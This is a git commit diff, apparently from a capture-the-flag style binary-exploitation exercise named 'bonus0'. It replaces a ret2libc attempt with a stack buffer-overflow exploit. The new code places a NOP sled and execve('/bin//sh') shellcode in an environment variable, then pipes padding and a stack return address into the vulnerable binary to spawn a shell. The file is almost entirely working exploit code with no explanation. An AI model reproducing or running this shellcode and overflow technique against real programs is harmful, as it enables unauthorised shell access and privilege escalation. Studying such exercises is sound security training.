462ca76a77b455065a38f484ba98aaae7c7c82a4
Azeddine El makkaoui <ael-makk@e1r13p5.1337.ma>
2022-10-08 17:42:52 +0100

    bonus 0

--- bonus0/script.py
+++ bonus0/script.py
@@ -1,17 +1,6 @@
-import struct 
-import time
-
-
-str1 = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\n" 
-str2 = "IIIIJJJJK"
-
-bin_sh = struct.pack("I", 0xb7f8cc58)
-ret_after_system("I", 0xb7e5ebe0)
-system = struct.pack("I", 0xb7e6b060)
 
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n";
 
+export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n"')
 
-print str1
-time.sleep(2)
-print str2 + shellcode
+(python -c 'print "A" * 20' ; sleep 1; python -c 'print "A" * 14 + "\xbf\xff\xf5\xb0"[::-1] + "E"'; cat ) | ./bonus0
